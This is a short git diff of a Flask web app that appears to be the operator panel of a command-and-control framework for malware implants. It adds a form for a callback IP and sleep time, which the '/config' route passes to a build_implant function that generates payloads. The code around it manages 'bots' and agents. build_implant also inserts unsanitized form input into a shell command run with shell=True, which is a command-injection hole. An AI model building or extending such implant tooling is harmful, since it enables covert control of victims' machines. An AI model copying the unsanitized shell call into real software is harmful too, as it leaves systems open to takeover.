@@ -1,6 +1,9 @@
 from flask import Flask, render_template, redirect, url_for, request, session, flash, abort, send_from_directory
 from flask_sqlalchemy import SQLAlchemy
 from functools import wraps
+from flask_wtf import FlaskForm
+from wtforms import StringField
+from wtforms.validators import DataRequired
 
 import requests
 from config import BaseConfig
@@ -30,6 +33,12 @@ def login_required(f):
     return wrap
 
 
+
+class MyForm(FlaskForm):
+    ip = StringField('IP')
+    sleep = StringField('Sleep Time')
+
+
 def build_implant(ip="127.0.0.1", sleepTime="0"):
     subprocess.Popen([f"implant/payloads/make.sh -h {ip} -s {sleepTime}"], shell=True)
 
@@ -53,12 +62,13 @@ def add_agent(agent_dict):
 @app.route('/config', methods=['GET', 'POST'])
 @login_required
 def generate():
+    form = MyForm()
     if request.method == 'POST':
         args = [request.form[key] for key in request.form.keys() if request.form[key] != '']
         print(args)
         build_implant(*args)
-        flash("Payload successfuly generated!")
-    return render_template("config.html")
+        print("Payload Successfuly Generated!")
+    return render_template("config.html", form=form)
 
 
 @app.route('/bots', methods=['GET'])
